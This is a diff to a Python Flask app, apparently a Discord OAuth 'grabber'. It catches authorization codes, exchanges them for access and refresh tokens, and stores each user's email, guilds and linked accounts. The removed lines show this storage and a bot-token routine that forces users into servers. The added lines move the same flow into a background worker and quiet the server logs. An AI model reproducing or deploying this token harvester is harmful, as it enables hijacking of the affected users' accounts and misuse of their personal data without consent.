@@ -1,17 +1,22 @@
 import requests
 import os.path
 import socket
-import json
-import time
+import logging
 from configparser import ConfigParser
 from flask import Flask, render_template, request
+from threading import Thread
 import oauth as worker
 app = Flask(__name__)
+flasLogger = logging.getLogger('werkzeug')
+flasLogger.setLevel(logging.ERROR)
 config = ConfigParser()
 configPath = 'resources/config.ini'
 dbPath = 'resources/db.json'
 
+Threads = []
+
 DB = []
+
 try:    
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
@@ -84,22 +89,9 @@ else:
         config.write(conf)
         print('writed config file in %s' % configPath)
 
-if(os.path.exists(dbPath)):
-    with open(dbPath, 'r+') as db:
-        try:
-            loadedJs = json.load(db)
-            DB = loadedJs
-            print("db was loaded!")
-            #print(DB)
-        except Exception as err:
-            print("error while reading file!: ",err)
-            exit()
-else:
-    print("db doesn't exist, recreating file!")
-    with open(dbPath, 'w') as db:
-        json.dump(DB, db, indent=4)
-    
 
+
+worker.DB = DB
 
 API_ENDPOINT = config['discord']['api']
 CLIENT_ID = config['discord']['client_id']
@@ -107,14 +99,12 @@ CLIENT_SECRET = config['discord']['client_secret']
 PORT = config['grabber']['port']
 URL_ARGS = config['grabber']['grabber_url_args']
 REDIRECT_URI = config['grabber']['redirect_uri'] + PORT + URL_ARGS
-'''
+
 worker.API_ENDPOINT = API_ENDPOINT
 worker.CLIENT_ID = CLIENT_ID
 worker.CLIENT_SECRET = CLIENT_SECRET
-worker.PORT = PORT
-worker.URL_ARGS = URL_ARGS
 worker.REDIRECT_URI = REDIRECT_URI
-'''
+
 @app.route("/")
 def home():
     return render_template('home.html')
@@ -123,158 +113,11 @@ def home():
 async def login():
     if (request.args.__contains__('code')):
         code = request.args['code']
-        code_result = exchange_code(code)
-        if(code_result.__contains__('access_token')):
-            token = code_result['access_token']
-            uInfo = await getUserInfo(token)
-            uGuilds = await getUserGuilds(token)
-            uConnections = await getUserConnections(token)
-            fGuilds = []
-            if(uGuilds.__len__() != 0):
-                for val in uGuilds:
-                    time.sleep(1)
-                    e = {
-                        'id':val['id'],
-                        'name':val['name'],
-                        'is_owner':val['owner']
-                    }
-                    fGuilds.append(e)
-            toDB = {
-                'id':uInfo['id'],
-                'username':uInfo['username'],
-                'global_name':uInfo['global_name'],
-                'token':token,
-                'refresh_token':code_result['refresh_token'],
-                'locale':uInfo['locale'],
-                'premium_type':uInfo['premium_type'],
-                'email':uInfo['email'],
-                'verified':uInfo['verified'],
-                'scopes':code_result['scope'],
-                'guilds':fGuilds,
-                'connections':uConnections
-            }
-            for val in DB:
-                if(val['id'] == toDB['id']):
-                    DB.remove(val)
-                    break
-            DB.append(toDB)
-            dbSave()
-        return code_result
-    else:
+        i = Threads.__len__()
+        t = Thread(target=worker.code_catch, args=(code, i,), daemon=True)
+        Threads.append(t)
+        Threads[i].start()
         return 'hi!'
-    
-
-def exchange_code(code):
-    data = {
-        'client_id': CLIENT_ID,
-        'client_secret': CLIENT_SECRET,
-        'grant_type': 'authorization_code',
-        'code': code,
-        'redirect_uri': REDIRECT_URI
-    }
-    headers = {
-        'Content-Type': 'application/x-www-form-urlencoded'
-    }
-    r = requests.post('%s/oauth2/token' % API_ENDPOINT, data=data, headers=headers)
-    r = r.json()
-    try:
-        if(r['error'] == 'invalid_grant'):
-            print('error while exchanging codes: ', r['error_description'])
-            return 'error'
-    except:
-        return r
-
-async def refresh_token(refresh_token):
-    data = {
-        'client_id': CLIENT_ID,
-        'client_secret': CLIENT_SECRET,
-        'grant_type': 'refresh_token',
-        'refresh_token': refresh_token
-    }
-    headers = {
-        'Content-Type': 'application/x-www-form-urlencoded'
-    }
-    r = requests.post('%s/oauth2/token' % API_ENDPOINT, data=data, headers=headers)
-    r = r.json()
-    try:
-        if(r['error'] == 'invalid_grant'):
-            print('error while refreshing token: invalid refresh_token!')
-    except:
-        return r
-
-
-async def getUserInfo(token):
-    info = requests.get('%s/users/@me' % API_ENDPOINT, headers={'Authorization':'Bearer %s' % token})
-    info = info.json()
-    try:
-        if(info['message'] == '401: Unauthorized'):
-            print('Invalid token!')
-            return 'error'
-    except:
-        return(info)
-
-async def getGuildProfile(token, guild_id):
-    guildProfile = requests.get('%s/users/@me/guilds/%s/member' % (API_ENDPOINT, guild_id), headers={'Authorization':'Bearer %s' % token})
-    guildProfile = guildProfile.json()
-    print(guildProfile)
-    try:
-        if(guildProfile['message'] == '401: Unauthorized'):
-            print('Invalid token!')
-            return 'error'
-        if(guildProfile['message'] == 'Неизвестная гильдия' or guildProfile['message'] == 'Unknown Guild'):
-            print('Invalid guild!')
-            return 'error'
-    except:
-        return(guildProfile)
-
-async def getUserGuilds(token):
-    guilds = requests.get('%s/users/@me/guilds' % API_ENDPOINT, headers={'Authorization':'Bearer %s' % token})
-    guilds = guilds.json()
-    try:
-        if(guilds['message'] == '401: Unauthorized'):
-            print('Invalid token!')
-            return 'error'
-    except:
-        return(guilds)
-    
-async def getUserConnections(token):
-    connections = requests.get('%s/users/@me/connections' % API_ENDPOINT, headers={'Authorization':'Bearer %s' % token})
-    connections = connections.json()
-    try:
-        if(connections['message'] == '401: Unauthorized'):
-            print('Invalid token!')
-            return 'error'
-    except:
-        return(connections)
-
-async def joinGuild(token, user_id, bot_token, guild_id):
-    data = {'access_token': token}
-    data = json.dumps(data)
-    headers = {
-        'Authorization':'Bot %s' % bot_token,
-        'Content-Type': "application/json",
-    }
-    r = requests.put('%s/guilds/%s/members/%s' % (API_ENDPOINT, guild_id, user_id), data=data, headers=headers)
-    r = r.json()
-    try:
-        if(r['message'] == '401: Unauthorized'):
-            print('Invalid bot token!')
-            return 'error'
-        elif(r['message'] == 'Invalid OAuth2 access token'):
-            print('Invalid user token!')
-            return 'error'
-        elif(r['message'] == 'Неизвестная гильдия' or r['message'] == 'Unknown Guild'):
-            print('Invalid guild id!')
-            return 'error'
-        else:
-            print(r)
-            return 'error'
-    except:
-        return(r)
-
-def dbSave():
-    with open(dbPath, 'w') as db:
-        json.dump(DB, db, indent=4)
 
 if __name__ == "__main__":
     app.run(debug = False, port=PORT,host=LOCAL_IP)
